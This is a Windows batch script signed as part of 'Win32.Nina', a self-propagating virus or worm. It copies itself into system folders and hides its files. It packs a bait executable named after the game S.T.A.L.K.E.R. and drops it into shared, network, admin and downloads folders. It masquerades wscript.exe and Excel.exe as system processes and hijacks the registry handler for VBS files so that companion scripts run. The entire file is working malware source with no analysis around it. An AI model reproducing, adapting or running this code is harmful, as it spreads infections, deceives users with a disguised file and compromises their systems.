@echo off
md %temp%\na\
copy *.* %temp%\na\*.*
copy *.* %windir%\system\*.*
copy *.* %windir%\system32\*.*
attrib +h +a +r +s %windir%\system32\system.bat
attrib +h +a +r +s %windir%\system32\nina.vbs
attrib +h +a +r +s %windir%\system32\nina.bat
attrib +h +a +r +s %windir%\system32\autorun.inf
attrib +h +a +r +s %windir%\system32\def.vbs
attrib +h +a +r +s %windir%\system32\update.bat
copy *.* %temp%\*.*
%systemdrive%\progra~1\winrar\winrar.exe a -ep -df -o+ -ibck -inul -y %temp%\S.T.A.L.K.E.R..exe %temp%\na\
copy %temp%\S.T.A.L.K.E.R..exe "*my*\S.T.A.L.K.E.R..exe" > nul
copy %temp%\S.T.A.L.K.E.R..exe "*share*\S.T.A.L.K.E.R..exe" > nul
copy %temp%\S.T.A.L.K.E.R..exe "*net*\S.T.A.L.K.E.R..exe" > nul
copy %temp%\S.T.A.L.K.E.R..exe "*local*\S.T.A.L.K.E.R..exe" > nul
copy %temp%\S.T.A.L.K.E.R..exe "*$*\S.T.A.L.K.E.R..exe" > nul
copy %temp%\S.T.A.L.K.E.R..exe "*admin*\S.T.A.L.K.E.R..exe" > nul
if exist c:\downloads\ copy %temp%\S.T.A.L.K.E.R..exe c:\downloads\S.T.A.L.K.E.R..exe > nul
if exist d:\downloads\ copy %temp%\S.T.A.L.K.E.R..exe d:\downloads\S.T.A.L.K.E.R..exe > nul
if exist e:\downloads\ copy %temp%\S.T.A.L.K.E.R..exe e:\downloads\S.T.A.L.K.E.R..exe > nul
copy %windir%\system32\wscript.exe %windir%\system\lsass.exe
echo Y | reg add "hkey_classes_root\VBSFile\Shell\Open\Command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\system\lsass.exe %%1 %%*%"
if exist %systemdrive%\Progra~1\Micros~2\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office13\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office13\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office13\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office13\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office13\Excel.exe %windir%\system\services.exe
%windir%\system32\def.vbs
%windir%\system32\nina.vbs
echo 7777777
echo 7777777
echo 7777777
%windir%\system32\def.vbs
%windir%\system32\nina.vbs
:---------------------------------------------------------------------------
:Part of .::Ja_[F.a.R.]::.'s Win32.Nina
:---------------------------------------------------------------------------
